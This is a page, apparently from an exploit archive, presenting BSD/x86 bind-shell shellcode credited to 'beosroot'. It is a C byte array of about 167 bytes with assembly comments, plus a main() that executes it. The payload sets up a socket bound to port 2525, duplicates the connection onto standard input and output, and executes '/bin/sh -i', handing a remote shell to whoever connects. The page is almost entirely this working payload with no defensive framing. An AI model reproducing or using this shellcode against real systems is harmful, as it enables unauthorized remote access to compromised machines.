<html><head><title>BSD/x86 - bindshell on port 2525 - 167 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 -------------- bds/x86-bindshell on port 2525 167 bytes -------------------------
 *  AUTHOR : beosroot
 *   OS    : BSDx86 (Tested on FreeBSD)
 *   EMAIL : beosroot@hotmail.fr
             beosroot@null.net
 *  GR33TZ To : joseph-h, str0ke, MHIDO55,.....
 */
 
const char shellcode[] =
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x6a\x01&quot;                  // push   $0x1
    &quot;\x6a\x02&quot;                  // push   $0x2
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x61&quot;                  // push   $0x61
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x68\x10\x02\x09\xdd&quot;      // push   $0xdd090210
    &quot;\x89\xe0&quot;                  // mov    %esp,%eax
    &quot;\x6a\x10&quot;                  // push   $0x10
    &quot;\x50&quot;                      // push   %eax
    &quot;\xff\x74\x24\x1c&quot;          // pushl  0x1c %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x68&quot;                  // push   $0x68
    &quot;\x58&quot;                      // pop    $eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x6a\x01&quot;                  // push   $0x1
    &quot;\xff\x74\x24\x28&quot;          // pushl  0x28 %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x6a&quot;                  // push   $0x6a
    &quot;\x58&quot;                      // pop    $eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x83\xec\x10&quot;              // sub    $0x10,$esp
    &quot;\x6a\x10&quot;                  // push   $0x10
    &quot;\x8d\x44\x24\x04&quot;          // lea    0x4%esp,%eax
    &quot;\x89\xe1&quot;                  // mov    %esp,%ecx
    &quot;\x51&quot;                      // push   %ecx
    &quot;\x50&quot;                      // push   %eax
    &quot;\xff\x74\x24\x4c&quot;          // pushl  0x4c %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x1e&quot;                  // push   %0x1e
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x50&quot;                      // push   %eax
    &quot;\xff\x74\x24\x58&quot;          // pushl  0x58 %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x06&quot;                  // push   $0x6
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\xff\x74\x24\x0c&quot;          // pushl  0xc %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x5a&quot;                  // push   $0x5a
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x6a\x01&quot;                  // push   $0x1
    &quot;\xff\x74\x24\x18&quot;          // pushl  0x18 %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x5a&quot;                  // push   $0x5a
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x6a\x02&quot;                  // push   $0x2
    &quot;\xff\x74\x24\x24&quot;          // pushl  0x24 %esp
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x5a&quot;                  // push   $0x5a
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;                  // int    $0x80
    &quot;\x68\x73\x68\x00\x00&quot;      // push   $0x6873
    &quot;\x89\xe0&quot;                  // mov    %esp,%eax
    &quot;\x68\x2d\x69\x00\x00&quot;      // push   $0x692d
    &quot;\x89\xe1&quot;                  // mov    %esp,%ecx
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x51&quot;                      // push   %ecx
    &quot;\x50&quot;                      // push   %eax
    &quot;\x68\x2f\x73\x68\x00&quot;      // push   $0x68732f
    &quot;\x68\x2f\x62\x69\x6e&quot;      // push   $0x6e69622f
    &quot;\x89\xe0&quot;                  // mov    %esp,%eax
    &quot;\x8d\x4c\x24\x08&quot;          // lea    0x8 %esp,%ecx
    &quot;\x6a\x00&quot;                  // push   $0x0
    &quot;\x51&quot;                      // push   %ecx
    &quot;\x50&quot;                      // push   %eax
    &quot;\x50&quot;                      // push   %eax
    &quot;\x6a\x3b&quot;                  // push   $0x3b
    &quot;\x58&quot;                      // pop    %eax
    &quot;\xcd\x80&quot;;                 // int    $0x80
 
int main() {

    void (*hell)() = (void *)shellcode;
    return (*(int(*)())shellcode)();

} 



// the end o.O

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
